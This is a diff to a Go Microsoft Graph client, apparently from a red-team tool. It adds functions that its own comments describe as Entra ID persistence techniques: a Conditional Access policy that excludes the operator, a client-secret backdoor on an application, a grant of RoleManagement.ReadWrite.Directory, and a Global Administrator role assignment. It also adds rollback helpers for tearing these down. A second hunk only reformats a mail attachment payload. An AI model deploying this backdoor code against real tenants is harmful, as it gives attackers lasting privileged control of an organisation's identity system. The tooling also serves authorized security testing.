@@ -338,6 +338,78 @@ func (c *Client) GetUserDirectReports(ctx context.Context) (json.RawMessage, err
 }
 
 // deleteResource issues a DELETE and discards the (empty) body.
+// ─── Persistence: Conditional Access, SP credentials, role assignments ─────────
+// These mirror the GA/Security-Admin persistence techniques documented for
+// Entra ID (AADInternals / ROADtools). Each returns the created object so the
+// caller can record a deployment-ledger entry with a Graph-kind rollback.
+
+// CreateConditionalAccessPolicy creates a CA policy from a caller-built body.
+// Used for the CA-exclusion technique (enforce a control on everyone except the
+// operator). Returns the created policy including its id.
+func (c *Client) CreateConditionalAccessPolicy(ctx context.Context, policy map[string]interface{}) (json.RawMessage, error) {
+	return c.post(ctx, "/identity/conditionalAccess/policies", policy)
+}
+
+// AddAppPassword adds a client secret (password credential) to an application —
+// the core of a service-principal credential backdoor. The response includes
+// secretText (shown to the operator once) and keyId (used to revoke it).
+func (c *Client) AddAppPassword(ctx context.Context, appObjectID, displayName string) (json.RawMessage, error) {
+	payload := map[string]interface{}{
+		"passwordCredential": map[string]interface{}{"displayName": displayName},
+	}
+	return c.post(ctx, "/applications/"+appObjectID+"/addPassword", payload)
+}
+
+// GetServicePrincipalByAppID resolves a service principal by its appId — used to
+// find the resource SP that owns an app role (e.g. the Microsoft Graph SP,
+// appId 00000003-0000-0000-c000-000000000000).
+func (c *Client) GetServicePrincipalByAppID(ctx context.Context, appID string) (json.RawMessage, error) {
+	return c.get(ctx, "/servicePrincipals?$filter=appId eq '"+appID+"'")
+}
+
+// AssignAppRole grants an app role (application permission) to a principal SP on
+// a resource SP — e.g. RoleManagement.ReadWrite.Directory on the Graph SP, the
+// high-privilege half of an SP backdoor. resourceSpID is both the URL target and
+// the resourceId. Returns the assignment including its id.
+func (c *Client) AssignAppRole(ctx context.Context, resourceSpID, principalID, appRoleID string) (json.RawMessage, error) {
+	payload := map[string]interface{}{
+		"principalId": principalID,
+		"resourceId":  resourceSpID,
+		"appRoleId":   appRoleID,
+	}
+	return c.post(ctx, "/servicePrincipals/"+resourceSpID+"/appRoleAssignedTo", payload)
+}
+
+// AssignDirectoryRole assigns a directory role (e.g. Global Administrator,
+// roleDefinitionId 62e90394-69f5-4237-9190-012177145e10) to a principal at a
+// scope — the role-assignment persistence technique. Returns the assignment.
+func (c *Client) AssignDirectoryRole(ctx context.Context, principalID, roleDefinitionID, directoryScopeID string) (json.RawMessage, error) {
+	if directoryScopeID == "" {
+		directoryScopeID = "/"
+	}
+	payload := map[string]interface{}{
+		"principalId":      principalID,
+		"roleDefinitionId": roleDefinitionID,
+		"directoryScopeId": directoryScopeID,
+	}
+	return c.post(ctx, "/roleManagement/directory/roleAssignments", payload)
+}
+
+// RollbackCall executes an authenticated rollback request (typically DELETE or
+// PATCH) against a Graph-relative path. It is used by the deployment-ledger
+// teardown to undo a previously deployed artifact. A non-2xx response surfaces
+// as an error so the teardown can mark the artifact as failed.
+func (c *Client) RollbackCall(ctx context.Context, method, path, body string) error {
+	var rdr io.Reader
+	hdrs := map[string]string{}
+	if body != "" {
+		rdr = strings.NewReader(body)
+		hdrs["Content-Type"] = "application/json"
+	}
+	_, err := c.request(ctx, method, graphBase+path, rdr, hdrs)
+	return err
+}
+
 func (c *Client) deleteResource(ctx context.Context, path string) error {
 	req, err := http.NewRequestWithContext(ctx, "DELETE", graphBase+path, nil)
 	if err != nil {
@@ -672,9 +744,9 @@ func (c *Client) CreateMailDraft(ctx context.Context, subject, htmlBody string, 
 // AddAttachmentToDraft attaches a file to a draft message.
 func (c *Client) AddAttachmentToDraft(ctx context.Context, messageID, filename, contentType string, data []byte) error {
 	payload := map[string]interface{}{
-		"@odata.type": "#microsoft.graph.fileAttachment",
-		"name":        filename,
-		"contentType": contentType,
+		"@odata.type":  "#microsoft.graph.fileAttachment",
+		"name":         filename,
+		"contentType":  contentType,
 		"contentBytes": base64.StdEncoding.EncodeToString(data),
 	}
 	_, err := c.post(ctx, "/me/messages/"+messageID+"/attachments", payload)
